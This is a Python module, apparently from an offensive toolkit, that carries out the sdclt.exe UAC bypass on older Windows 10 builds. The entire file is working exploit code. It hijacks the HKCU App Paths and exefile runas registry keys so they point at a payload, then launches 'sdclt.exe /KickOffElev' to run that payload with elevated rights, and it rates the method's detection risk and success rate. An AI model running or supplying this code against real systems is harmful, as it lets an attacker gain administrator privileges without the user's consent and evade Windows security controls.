"""
Sdclt UAC Bypass Module
Bypasses UAC using sdclt.exe registry hijacking.

How it works:
1. sdclt.exe (Backup and Restore) auto-elevates
2. It checks HKCU registry for App Paths
3. We create registry key to hijack execution
4. When sdclt runs, our payload executes elevated

Works on: Windows 10 up to build 17134 (1803)
"""

from pathlib import Path

import sys

sys.path.append(str(Path(__file__).parent.parent))
from ..core.base import UACBypassBase

try:
    import winreg

    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False


class SdcltBypass(UACBypassBase):
    """UAC bypass using sdclt.exe."""

    METHOD_NAME = "sdclt"
    DESCRIPTION = "Sdclt.exe UAC bypass (Windows 10)"
    MIN_VERSION = 10
    MAX_BUILD = 17134  # Patched after 1803
    DETECTION_RISK = "Medium"
    SUCCESS_RATE = 0.80

    # Registry paths
    REG_PATH_APP = r'Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe'
    REG_PATH_RUNAS = r'Software\Classes\exefile\shell\runas\command'

    # Sdclt executable path
    SDCLT_PATH = r'C:\Windows\System32\sdclt.exe'

    def __init__(self, output_dir: str = "uac_bypasses", verbose: bool = False):
        """
        Initialize the sdclt bypass.

        Args:
            output_dir: Directory for storing output files
            verbose: Enable verbose logging
        """
        super().__init__(output_dir, verbose)
        self.log("Sdclt bypass module initialized", "SUCCESS")

    def bypass(self, payload_path: str) -> bool:
        """
        Execute sdclt UAC bypass.

        Args:
            payload_path: Path to payload executable

        Returns:
            True if successful, False otherwise
        """
        if not WINDOWS_AVAILABLE:
            self.log("Windows registry not available", "ERROR")
            return False

        self.log("Configuring registry for sdclt bypass...", "INFO")

        try:
            # Method 1: Hijack control.exe path
            key1 = winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.REG_PATH_APP)
            winreg.SetValueEx(key1, '', 0, winreg.REG_SZ, payload_path)
            winreg.CloseKey(key1)

            self.modified_registry.append(
                (winreg.HKEY_CURRENT_USER, self.REG_PATH_APP, '')
            )

            # Method 2: Hijack runas command (backup method)
            key2 = winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.REG_PATH_RUNAS)
            winreg.SetValueEx(key2, '', 0, winreg.REG_SZ, payload_path)
            winreg.SetValueEx(key2, 'IsolatedCommand', 0, winreg.REG_SZ, payload_path)
            winreg.CloseKey(key2)

            self.modified_registry.append(
                (winreg.HKEY_CURRENT_USER, self.REG_PATH_RUNAS, '')
            )

            self.log("Registry configured successfully", "SUCCESS")

            # Execute sdclt with elevation flag
            self.log("Triggering sdclt.exe...", "INFO")

            success = self.execute_process(
                f'{self.SDCLT_PATH} /KickOffElev',
                wait=False,
                timeout=3
            )

            return success

        except Exception as e:
            self.log(f"Sdclt bypass failed: {e}", "ERROR")
            return False


if __name__ == "__main__":
    bypass = SdcltBypass(verbose=True)
    print(f"\nMethod: {bypass.METHOD_NAME}")
    print(f"Description: {bypass.DESCRIPTION}")
    print(f"Success Rate: {bypass.SUCCESS_RATE * 100:.0f}%")